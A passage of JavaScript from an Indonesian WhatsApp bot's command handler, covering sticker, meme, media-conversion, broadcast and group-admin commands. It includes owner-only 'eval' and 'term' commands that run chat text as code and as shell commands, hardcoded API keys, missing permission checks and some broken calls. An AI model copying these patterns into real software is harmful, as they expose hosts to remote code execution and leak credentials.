if (args.length == 0) return reply(`Example: ${prefix + command} wann`)



  buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)



wann.sendMessage(from, buffer, sticker, { quoted: freply })



break







case 'sfire2': 







reply('Loading.... ')



encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



media = await wann.downloadAndSaveMediaMessage(encmedia)



tolink = await uptotele(media)



ranp = getRandom('.gif')



rano = getRandom('.webp')



anu1 = await getBuffer (`https://api.zeks.xyz/api/burning-image?apikey=IkyChan&image=${tolink}`)



sendStickerUrl(from, `${anu1}`)







break



case 'tgg': 







reply('Loading.... ')



encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



media = await wann.downloadAndSaveMediaMessage(encmedia)



tolink = await uptotele(media)



ranp = getRandom('.gif')



rano = getRandom('.webp')



anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${tolink}`



sendStickerUrl(from, `${anu1}`)







break



case 'sf':



encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



media = await wann.downloadAndSaveMediaMessage(encmedia)



tolink = await uptotele(media)



ranp = getRandom('.gif')



rano = getRandom('.webp')



reply(mess.wait)







pjr = await getBuffer(`https://api.zeks.xyz/api/burning-image?apikey=IkyChan&image${encodeURI(tolink)}`)



wann.sendMedsage(from , pjr , sticker, {quoted: wan})











break



case 'tggg': 







reply('Loading.... ')



encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



media = await wann.downloadAndSaveMediaMessage(encmedia)



tolink = await uptotele(media)



ranp = getRandom('.gif')



rano = getRandom('.webp')



anu1 = `https://api.lolhuman.xyz/api/editor/triggered?apikey=IkyChan&img=${tolink}`



sendStickerUrl(from, `${anu1}`)







break



case 'triggered3':



ini_url = args[0]







ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/editor/triggered?apikey=IkyChan&img=${ini_url}`)







wann.sendMessage(from, ini_buffer, image, { quoted: freply })



break



case 'sfiree':







if (isImage || isQuotedImage) {



  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



  let media = await wann.downloadAndSaveMediaMessage(encmedia)



  var tolink = await uptotele(media)



  let ane = await getBuffer(`https://api.zeks.xyz/api/burning-image?apikey=IkyChan&image=${tolink}`)



  fs.writeFileSync('./sticker/triggered.webp', ane)



  exec(`webpmux -set exif ./sticker/data.exif ./sticker/triggered.webp -o ./sticker/triggered.webp`, async (error) => {



 if (error) return reply(mess.error.api)



wann.sendMessage(from, fs.readFileSync(`./sticker/triggered.webp`), sticker, {quoted: freply})







 fs.unlinkSync(`./sticker/triggered.webp`)	



  })



}







break 



case "triggered":



case 'tiger':



if (isImage || isQuotedImage) {



 var lin = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



 var dow = await wann.downloadAndSaveMediaMessage(wan)



 var tolink = await uptotele(dow)



 ranp = getRandom('.gif')



 rano = getRandom('.webp')



 var ini_buffer = `https://api.lolhuman.xyz/api/editor/triggered?apikey=IkyChan&img=${tolink}`



 exec(`wget "${ini_buffer}" -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {



  fs.unlinkSync(ranp)



  wann.sendMessage(from, fs.readFileSync(rano), sticker, { quoted: wan }).then(() => {



 fs.unlinkSync(rano)



  })



})



  } else {



 reply("only foto")



  }



  break



  case 'stickernobg': case 'stikernobg': case 'snobg': case 'removebg': case 'nobg':







  if (isImage || isQuotedImage) {



let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: wan



let media = await wann.downloadAndSaveMediaMessage(encmedia)



var file_name = getRandom('.png')



var file_name2 = getRandom('.webp')



request({



  url: `https://api.lolhuman.xyz/api/removebg?apikey=${setting.lolkey}`,



  method: 'POST',



  formData: {



 "img": fs.createReadStream(media)



  },



  encoding: "binary"



}, async function(error, response, body) {



  fs.unlinkSync(media)



  fs.writeFileSync(file_name, body, "binary")



  await ffmpeg(`./${file_name}`)



  .input(file_name)



  .on('start', function (cmd) {



 console.log(`Started : ${cmd}`)



  })



  .on('error', function(err) {



 console.log(err)



 reply(mess.error.api)



 fs.unlinkSync(file_name)



  })



  .on('end', function() {



 console.log('Finish')



 exec(`webpmux -set exif ./sticker/data.exif ./${file_name2} -o ./${file_name2}`, async (error) => {



if (error) return reply(mess.error.api)



 wann.sendMessage(from, fs.readFileSync(file_name2), sticker, {quoted: wan})







  fs.unlinkSync(file_name)



  fs.unlinkSync(file_name2)



})



  })



  .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



  .toFormat('webp')



  .save(file_name2)



});



 } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



let media = await wann.downloadAndSaveMediaMessage(encmedia)



var ran = getRandom('.png')



exec(`ffmpeg -i ${media} ${ran}`, async (err) => {



  fs.unlinkSync(media)



  if (err) return reply('Gagal :V')



 var file_name = getRandom('.png')



  var file_name2 = getRandom('.webp')



  request({



 url: `https://api.lolhuman.xyz/api/removebg?apikey=${setting.olkey}`,



 method: 'POST',



 formData: {



"img": fs.createReadStream(ran)



 },



 encoding: "binary"



  }, async function(error, response, body) {



 fs.unlinkSync(ran)



 fs.writeFileSync(file_name, body, "binary")



 await ffmpeg(`./${file_name}`)



 .input(file_name)



 .on('start', function (cmd) {



console.log(`Started : ${cmd}`)



 })



 .on('error', function(err) {



console.log(err)



reply(mess.error.api)



fs.unlinkSync(file_name)



 })



 .on('end', function() {



console.log('Finish')



exec(`webpmux -set exif ./sticker/data.exif ./${file_name2} -o ./${file_name2}`, async (error) => {



  if (error) return reply(mess.error.api)



wann.sendMessage(from, fs.readFileSync(file_name2), sticker, {quoted: wan})







 fs.unlinkSync(file_name)



 fs.unlinkSync(file_name2)



  })



 })



 .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



 .toFormat('webp')



 .save(file_name2)



  });



})



 } else {



reply(`Kirim gambar dengan caption ${prefix}snobg atau tag gambar yang sudah dikirim`)



 }











 break



 case "triggered2":



 case 'tiger2':



 if (isImage || isQuotedImage) {



  var lin = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



  var dow = await wann.downloadAndSaveMediaMessage(lin)



  var tolink = await uptotele(dow)



  ranp = getRandom('.gif')



  rano = getRandom('.webp')



  var ini_buffer = `https://some-random-api.ml/canvas/triggered?avatar=${tolink}`



  exec(`wget "${ini_buffer}" -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {



fs.unlinkSync(ranp)



wann.sendMessage(from, fs.readFileSync(rano), sticker, { quoted: wan }).then(() => {



  fs.unlinkSync(rano)



})



 })



} else {



  reply("only foto")



}



break



case 'ttg':



teks = args.join(' ')



mek = encodeURIComponent(teks)



if (args.length < 2) return 



 let ane = await getBuffer(`https://api.lolhuman.xyz/api/attp?apikey=IkyChan&text=${mek}`)



  fs.writeFileSync('./sticker/ttg.webp', ane)



  exec(`webpmux -set exif ./sticker/data.exif ./sticker/ttg.webp -o ./sticker/ttg.webp`, async (error) => {



 if (error) return reply(mess.error.api)



wann.sendSticker(from, fs.readFileSync(`./sticker/ttg.webp`), sticker, {quoted: freply})



 



 fs.unlinkSync(`./sticker/ttg.webp`)	



  })







  break



  case 'loliv':



  case 'lolivid':



  case 'lolivideo':



  reply(mess.wait)



  anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')



  .then(async (body) => {



 anu = body.split('\n')



 anu = anu[Math.floor(Math.random() * anu.length)]



 sendMediaURL(from, anu)



  })



  .catch(async (err) => {



 console.error(err)



 reply(`${err}`)



  })



  break











  case 's2':{











 if (isImage || isQuotedImage) {



let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



let media = await wann.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)



await ffmpeg(`${media}`)



.input(media)



.on('start', function (cmd) {



  console.log(`Started : ${cmd}`)



})



.on('error', function (err) {



  console.log(`Error : ${err}`)



  fs.unlinkSync(media)



  reply(mess.error.api)



})



.on('end', function () {



  console.log('Finish')



  exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {



 if (error) return reply(mess.error.api)



  wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: wan})







fs.unlinkSync(media)	



fs.unlinkSync(`./sticker/${sender}.webp`)	



 })



})



.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



.toFormat('webp')



.save(`./sticker/${sender}.webp`)



 } else if ((isVideo && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {



let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



let media = await wann.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)



reply(mess.wait)



await ffmpeg(`${media}`)



.inputFormat(media.split('.')[4])



.on('start', function (cmd) {



  console.log(`Started : ${cmd}`)



})



.on('error', function (err) {



  console.log(`Error : ${err}`)



  fs.unlinkSync(media)



  let tipe = media.endsWith('.mp4') ? 'video' : 'gif'



  reply(mess.error.api)



})



.on('end', function () {



  console.log('Finish')



  exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {



if (error) return reply(mess.error.api)



  wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: wan})







fs.unlinkSync(media)



fs.unlinkSync(`./sticker/${sender}.webp`)



 })



})



.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



.toFormat('webp')



.save(`./sticker/${sender}.webp`)



 } else {



reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)



 }



  }



  break



  case 'gifstiker':



  case 's':



  case 'stickergif':  



  case 'sticker':



  case 'stiker':



  if ((isMedia && !wan.message.videoMessage || isQuotedImage) && args.length == 0) {



 const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



 const media = await wann.downloadAndSaveMediaMessage(encmedia)



 ran = '666.webp'



 await ffmpeg(`./${media}`)



 .input(media)



 .on('start', function (cmd) {



  console.log(`Started : ${cmd}`)



})



 .on('error', function (err) {



  console.log(`Error : ${err}`)



  fs.unlinkSync(media)



  reply('error')



})



 .on('end', function () {



console.log('Finish')



wann.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})



fs.unlinkSync(media)



fs.unlinkSync(ran)



 })



 .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



 .toFormat('webp')



 .save(ran)



  } else if ((isMedia && wan.message.videoMessage.seconds < 11 || isQuotedVideo && wan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {



 const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



 const media = await wann.downloadAndSaveMediaMessage(encmedia)



 ran = '999.webp'



 reply(mess.wait)



 await ffmpeg(`./${media}`)



 .inputFormat(media.split('.')[1])



 .on('start', function (cmd) {



console.log(`Started : ${cmd}`)



 })



 .on('error', function (err) {



console.log(`Error : ${err}`)



fs.unlinkSync(media)



tipe = media.endsWith('.mp4') ? 'video' : 'gif'



reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)



 })



 .on('end', function () {



console.log('Finish')



wann.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})



fs.unlinkSync(media)



fs.unlinkSync(ran)



 })



 .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



 .toFormat('webp')



 .save(ran)



  } else {



 reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)



  }



  break



  case 'take':



  case 'colong':



  if (!isQuotedSticker) return reply('Stiker aja om')



 encmedia = JSON.parse(JSON.strngify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo



  media = await wann.downloadAndSaveMediaMessage(encmedia)



  anu = args.join(' ').split('|')



  satu = anu[0] !== '' ? anu[0] : `${pushname}`



  dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`



  require('./lib/fetch.js').createExif(satu, dua)



  require('./lib/fetch.js').modStick(media, wann, wan, from)



  break



  case 'delwm':



  if (!isQuotedSticker) return reply('Stiker aja om')



 encmedia = JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo



  media = await wann.downloadAndSaveMediaMessage(encmedia)



  anu = args.join(' ').split('|')



  satu = anu[0] !== '' ? anu[0] : ``



  dua = typeof anu[1] !== 'undefined' ? anu[1] : ``



  require('./lib/fetch.js').createExif(satu, dua)



  require('./lib/fetch.js').modStick(media, wann, wan, from)



  break



  case 'stikerwm':



  case 'stickerwm':



  case 'swm':



  var a = arg.split("|")[0];



  var b = arg.split("|")[1];



  if (isMedia && !wan.message.videoMessage || isQuotedImage ) {



 const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



 media = await wann.downloadAndSaveMediaMessage(encmedia)



 await createExif(a,b)



 out = getRandom('.webp')



 ffmpeg(media)



 .on('error', (e) => {



console.log(e)



wann.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: freply })



fs.unlinkSync(media)



 })



 .on('end', () => {



_out = getRandom('.webp')



spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])



.on('exit', () => {



  wann.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: freply })



  fs.unlinkSync(out)



  fs.unlinkSync(_out)



  fs.unlinkSync(media)



})



 })



 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



 .toFormat('webp')



 .save(out) 



  } else if ((isMedia && wan.message.videoMessage.seconds < 11 || isQuotedVideo && wan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {



 const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



 const media = await wann.downloadAndSaveMediaMessage(encmedia)



 pe = args.join('')



 var a = pe.split("|")[0];



 var b = pe.split("|")[1];



 await createExif(a,b)



 out = getRandom('.webp')



 ffmpeg(media)



 .on('error', (e) => {



console.log(e)



wann.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: freply })



fs.unlinkSync(media)



 })



 .on('end', () => {



_out = getRandom('.webp')



spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])



.on('exit', () => {



  wann.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: freply })



  fs.unlinkSync(out)



  fs.unlinkSync(_out)



  fs.unlinkSync(media)



})



 })



 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



 .toFormat('webp')



 .save(out) 



  } else {



 reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)



  }



  break



  case 'toimg':



  if (!isQuotedSticker) return reply('reply stickernya')



 reply(mess.wait)



  encmedia = JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo



  media = await wann.downloadAndSaveMediaMessage(encmedia)



  ran = getRandom('.png')



  exec(`ffmpeg -i ${media} ${ran}`, (err) => {



 fs.unlinkSync(media)



 if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')



buffer = fs.readFileSync(ran)



 wann.sendMessage(from, buffer, image, {quoted: freply, caption: 'Nih'})



 fs.unlinkSync(ran)



  })



  break



  case 'smeme': 



  reply('Loading.... ')



  top = arg.split('|')[0]



  bottom = arg.split('|')[1]



  var imgbb = require('imgbb-uploader')



  if ((isMedia && !wan.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {



 ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan 



 owgi = await  wann.downloadAndSaveMediaMessage(ger)



 anu = await imgbb("bf0832d1bbee804ec793d4a830a26238", owgi)



 teks = `${anu.display_url}`



 ranp = getRandom('.gif')



 rano = getRandom('.webp')



 anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`



 sendStickerUrl(from, `${anu1}`)



  } else {



 reply('Gunakan foto/stiker!')



  }



  break







  case 'memeimg':



  case 'memegen': 



  top = arg.split('|')[0]



  bottom = arg.split('|')[1]



  var imgbb = require('imgbb-uploader')



  if ((isMedia && !wan.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {



 reply(mess.wait)



 ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan 



 owgi = await wann.downloadAndSaveMediaMessage(ger)



 anu = await imgbb("f643a4d2fb9ea99221cb4a3432d6a4ba", owgi)



 teks = `${anu.display_url}`



 ranp = getRandom('.gif')



 rano = getRandom('.webp')



 anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`



 sendMediaURL(from, `${anu1}`, mess.success)



  } else {







  }



  break



  case 'togif':



  if ((isMedia && !wan.message.videoMessage || isQuotedSticker) && args.length == 0) {



reply(mess.wait)



encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



mediaaa = await wann.downloadAndSaveMediaMessage(encmediaaa)



a = await webp2gifFile(mediaaa)



mp4 = await getBuffer(a.result)



wann.sendMessage(from, mp4, video, {mimetype: 'video/gif', quoted: freply, caption: mess.success})



fs.unlinkSync(mediaaa)



 } else {



reply(mess.wrongFormat)



 }



 break



 case 'tovideo':



 if ((isMedia && !wan.message.videoMessage || isQuotedSticker) && args.length == 0) {



reply(mess.wait)



encmedia = JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo



mediaaa = await wann.downloadAndSaveMediaMessage(encmediaaa)



a = await webp2gifFile(mediaaa)



mp4 = await getBuffer(a.result)



wann.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: freply, caption: mess.success})



fs.unlinkSync(mediaaa)



 } else {



reply(mess.wrongFormat)



 }



 break



 case 'tomp3':



 wann.updatePresence(from, Presence.composing)



 if (!isQuotedVideo) return reply('Itu bukan video')



  encmedia = JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo



media = await wann.downloadAndSaveMediaMessage(encmedia)



ran = getRandom('.mp4')



exec(`ffmpeg -i ${media} ${ran}`, (err) => {



  fs.unlinkSync(media)



  if (err) return reply(mess.error)



 buffer = fs.readFileSync(ran)



  wann.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4'})



  fs.unlinkSync(ran)



})



break







//------------------< Ingfo Bot >-------------------



case 'runtime':
		    case 'test':
		            run = process.uptime() 
		            teks = `${kyun(run)}`
		            fakegroup(teks)
		            break


case 'donate': 



case 'donasi':



fakestatus(setting.txtDonasi)



break



case 'sourcecode': 



case 'sc': 



case 'src':


ftoko(`SC? NI ADA YANG ENC WKWK`)



break



case 'ping':



case 'speed':



timestampe = speed();



latensie = speed() - timestampe



ftoko(`「 *WANN BOTZ* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)



break



case 'botstat':



groups = wann.chats.array.filter(v => v.jid.endsWith('g.us'))



privat = wann.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))



ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`



charger = `${charging ? 'lagi dicas' : 'ga dicas'}`



uptime = process.uptime();



timestampe = speed();



totalChat = await wann.chats.all()



latensie = speed() - timestampe



total = math(`${groups.length}*${privat.length}`)



teks = `\`\`\`BOT STATISTICS\`\`\`



\`\`\`🐥 Group Chats : ${groups.length}\`\`\`



\`\`\`?? Private Chats : ${privat.length}\`\`\`



\`\`\`🐥 Total Chats : ${totalChat.length}\`\`\`



\`\`\`🐥 Speed : ${latensie.toFixed(4)} _Second_\`\`\`



\`\`\`🐥 Active Time : ${kyun(uptime)}\`\`\`







\`\`\`PHONE STATISTICS\`\`\`



\`\`\`🐥 Baterai : ${baterai}% ${charger}\`\`\`



\`\`\`🐥 Ram Usage : ${ram2}\`\`\`



\`\`\`?? Platform : ${os.platform()}\`\`\`



\`\`\`🐥 Hostname : ${os.hostname()}\`\`\`



\`\`\`🐥 Uptime : ${runtime(process.uptime())}\`\`\`



\`\`\`🐥 Wa Version: ${wann.user.phone.wa_version}\`\`\`



\`\`\`🐥 Os Version: ${wann.user.phone.os_version}\`\`\`



\`\`\`🐥 Device Manufacturer: ${wann.user.phone.device_manufacturer}\`\`\`



\`\`\`🐥 Device Model: ${wann.user.phone.device_model}\`\`\`



\`\`\`🐥 Os Build Number: ${wann.user.phone.os_build_number}\`\`\``



reply(teks)



break  



//------------------< Owner >-------------------



case 'addupdate':



if (!isOwner) return reply(mess.only.owner)



 if (!q) return reply(`Example: ${command} update fitur`)



_update.push(q)



 fs.writeFileSync('./database/bot/update.json', JSON.stringify(_update))



 reply(`Update fitur berhasil ditambahkan ke database!`)



 break



 case 'update':



 let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`



 for (let i of _update) {



updateList += `࿃ *${i.replace(_update)}*\n\n`



 }



 textImg(updateList)



 break



 case 'reset':



 if (!isOwner) return reply(mess.only.owner)



var reset = []



 glimit = reset



 _update = reset



 console.log('Hang tight, it\'s time to reset')



 fs.writeFileSync('./database/bot/glimit.json', JSON.stringify(glimit))



 fs.readFileSync('./database/bot/update.json', JSON.stringify(_update))



 textImg('Oke Desu ~')



 break



 case 'exif':



 if (!isOwner) return  reply(mess.only.owner)



if (!q) return reply(mess.wrongFormat)



  if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)



 exif.create(arg.split('|')[0], arg.split('|')[1])



  reply('sukses')



  break	



  case 'join': 



  if (!q) return reply('Linknya?')



 if (!isOwner) return reply(mess.only.owner)



if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Tod')



  link = args[0].replace('https://chat.whatsapp.com/','')



fak = wann.query({ json: ['action', 'invite', link],



  expect200: true })



reply('Berhasil Masuk Grup')



break



case 'eval':



try {



  if (!isOwner) return



 sy = args.join(' ')



  return eval(sy)



} catch(e) {



  reply(`${e}`)



}



break



case 'getquoted':



reply(JSON.stringify(wan.message.extendedTextMessage.contextInfo, null, 3))



break



case 'bc':

      case 'broadcast':



if (!isOwner) return  reply(mess.only.owner)



  if (args.length < 1) return reply('teks?')



 anu = await wann.chats.all()



  if (isMedia && !wan.message.videoMessage || isQuotedImage) {



 const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan



 bc = await wann.downloadMediaMessage(encmedia)



 for (let _ of anu) {



wann.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})



 }



 fakegroup('Suksess broadcast')

  } else {

 for (let _ of anu) {

sendMess(_.jid, `\n\n${body.slice(4)}`)

 }

 fakegroup('Suksess broadcast')

  }

break

case 'bcsticker':

case 'bcstik':

					if (!isOwner) return  reply(mess.only.owner)

					anu = await wann.chats.all()

					if (isMedia && !wan.message.videoMessage || isQuotedSticker) {

						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan

						bc = await wan.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							wan.sendMessage(_.jid, bc, sticker, {quoted:ftroli})

						}

						fakestatus(lang.successBc())

					}

					break

case 'bcvideo':

					if (!isOwner) return reply(lang.onlyOwner())

					anu = await wann.chats.all()

					if (isMedia && !wan.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan

						bc = await wan.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							wan.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})

						}

						fakestatus(lang.successBc())

					}

					break

	case 'bcaudio':

					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(lang.onlyOwner())

					anu = await wann.chats.all()

					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {

						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

						bc = await wann.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							wann.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})

						}

						fakestatus(lang.successBc())

					}

					break

  case 'clearall':



  if (!isOwner) return  reply(mess.only.owner)



 anu = await wann.chats.all()



  wann.setMaxListeners(25)



  for (let _ of anu) {



 wann.deleteChat(_.jid)



  }



  reply('Sukses delete all chat :)')



  break



  case 'term':



  if (!isOwner) return



 if (!q) return



exec(q, (err, stdout) => {



  if (err) return reply(`${err}`)



 if (stdout) {



reply(stdout)



 }



  })



 break 



 case 'shutdown':



 if (!isOwner) return 



reply(`Bye...`)



 await sleep(3000)



 process.exit()



 break



 case 'restart':



 if (!isOwner) return 



reply(mess.wait)



 exec(`node main`)



 reply('_Restarting Bot Success_')



 break



 case 'leaveall':



 if (!isOwner) return  reply(mess.only.owner)



let totalgroup = wann.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)



 for (let id of totalgroup) {



sendMess(id, 'Byee', null)



await sleep(3000)



wann.groupLeave(id)



 }



 break



//------------------< G R U P >-------------------



case 'kick':



if (!isBotGroupAdmins) return reply(mess.only.Badmin)



  if (!isGroupAdmins) return reply(mess.only.admin)



if (!isGroup) return reply(mess.only.group)



  kick(from, mentionUser)



break



case 'add':



if (wan.message.extendedTextMessage === null || wan.message.extendedTextMessage === undefined) {



  entah = arg.split("|")[0]



  entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")



  entah = `${entah}@s.whatsapp.net`



  wann.groupAdd(from, [entah])



} else {



  entah = wan.message.extendedTextMessage.contextInfo.participant



  wann.groupAdd(from, [entah])



}



break



case 'promote':



fakegroup('sukses promote admin')



mentioned = wan.message.extendedTextMessage.contextInfo.participant







if (mentioned.length !== 0){



 wann.groupMakeAdmin(from, mentioned)



 .then((res) => reply(jsonformat(res)))



 .catch((err) => reply(jsonformat(err)))



  } else if (isQuotedMsg) {



 wann.groupMakeAdmin(from, [quotedMsg.sender])



 .then((res) => reply(jsonformat(res)))



 .catch((err) => reply(jsonformat(err)))



  } else if (!isNaN(args[1])) {



 wann.groupMakeAdmin(from, [args[1] + '@s.whatsapp.net'])



 .then((res) => reply(jsonformat(res)))



 .catch((err) => reply(jsonformat(err)))



  } else {







